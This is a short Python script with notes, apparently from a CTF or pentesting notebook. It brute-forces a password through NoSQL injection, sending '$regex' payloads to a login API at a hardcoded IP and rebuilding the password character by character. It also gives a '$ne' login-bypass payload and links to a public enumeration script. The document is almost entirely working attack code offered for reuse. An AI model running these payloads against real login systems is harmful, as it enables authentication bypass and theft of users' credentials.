``` py
#!/bin/usr/python

import requests
import string
#import urllib.parse

url = 'http://46.101.23.157:30374/api/login'
flag = ""   

# Sexy way to change users
user = 'admin'


# When 302 redirect is seen, we restart our loop
restart = True

while restart:
    retstart = False

    # Regex unfriendly characters: "+" "*" "." "?" "|"
    for i in string.ascii_letters + string.digits + "`~!@#$%^&()-_{}=[]<>;:'":
        payload = flag + i
        post_data = {'username': user, 'password[$regex]' : "^" + payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)
        print(payload)

        if "Login Successful" in r.text: # To be changed according to the login fucntion reponse of webapp 
            
            restart = True
            flag = payload

            if i == "$":
                print ("\n[+] User: " + user + "\n[+] Password: " + flag[:-1])

                exit(0)
            break
```

Script to bruteforce nosqli password . Make changes in code accroding to response.

```
username[$ne]=toto&password[$ne]=cd
```
*Login bypass*

https://hackersarena.vulnfreak,org/

Public Scripts:
https://raw.githubusercontent.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/master/nosqli-user-pass-enum.py
